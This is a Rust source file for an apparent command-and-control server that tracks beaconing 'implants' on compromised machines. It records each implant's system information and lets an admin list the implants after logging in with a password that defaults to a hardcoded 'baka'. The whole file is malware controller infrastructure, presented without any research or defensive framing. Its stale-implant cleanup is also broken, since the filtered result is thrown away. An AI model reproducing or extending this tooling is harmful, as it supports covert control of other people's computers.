use std::{
    collections::HashMap,
    env,
    io::{Read, Write},
    net::{IpAddr, TcpListener, TcpStream},
    time::SystemTime,
};

use common::{IMPLANT_REPORT_RATE_SECONDS, Implant, MAX_PACKET_SIZE_BYTES, Packet, decode, encode};

fn main() -> Result<(), Box<dyn std::error::Error>> {
    let listener = TcpListener::bind("0.0.0.0:9120")?;
    let mut implants = HashMap::new();
    let mut admin_ip = None;

    for stream in listener.incoming() {
        let mut stream = stream.unwrap();
        let ip = stream.peer_addr().unwrap().ip();

        let mut buf = vec![0; MAX_PACKET_SIZE_BYTES];

        stream.read(&mut buf).expect("failed to read from stream");

        let decoded = decode(&buf).unwrap();
        println!("{decoded:?}");

        match decoded {
            Packet::Beacon { system_info } => {
                implants.insert(stream.peer_addr().unwrap().ip(), Implant::new(system_info));
            }
            Packet::DashboardLogin { password } => {
                let passwd = match env::var_os("TYSE_PASSWORD") {
                    Some(os_string) => os_string.into_string().unwrap_or("baka".to_string()),
                    None => "baka".to_string(),
                };

                if passwd == password {
                    stream.write(encode(Packet::LoginSuccess).unwrap().as_slice())?;

                    println!("{ip} logged in as admin");
                    admin_ip = Some(ip);
                } else {
                    println!("{ip} failed to log in");
                    stream.write(encode(Packet::LoginFailed).unwrap().as_slice())?;
                }
            }
            _ => {
                if let Some(admin_ip) = admin_ip
                    && stream.peer_addr().unwrap().ip() == admin_ip
                {
                    run_admin_command(&mut stream, &decoded, &mut implants)?;
                } else {
                    println!(
                        "Unauthorized device tried to access admin commands: {}",
                        stream.peer_addr().unwrap().ip()
                    );
                }
            }
        }
    }

    Ok(())
}

fn run_admin_command(
    stream: &mut TcpStream,
    decoded: &Packet,
    implants: &mut HashMap<IpAddr, Implant>,
) -> Result<(), Box<dyn std::error::Error>> {
    match decoded {
        Packet::ImplantListRequest => {
            remove_old_implants(implants);

            stream.write(
                encode(Packet::ImplantList(
                    implants.values().map(|implant| implant.clone()).collect(),
                ))
                .unwrap()
                .as_slice(),
            )?;
        }
        _ => {
            stream.write(encode(Packet::C2Alive).unwrap().as_slice())?;
        }
    }

    Ok(())
}

fn remove_old_implants(implants: &mut HashMap<IpAddr, Implant>) -> HashMap<IpAddr, Implant> {
    let now = SystemTime::now();

    implants
        .iter()
        .filter(|(_ip, implant)| {
            now.duration_since(implant.last_beacon_timestamp)
                .unwrap()
                .as_secs()
                < IMPLANT_REPORT_RATE_SECONDS.end
        })
        .map(|(ip, implant)| (*ip, implant.clone()))
        .collect()
}
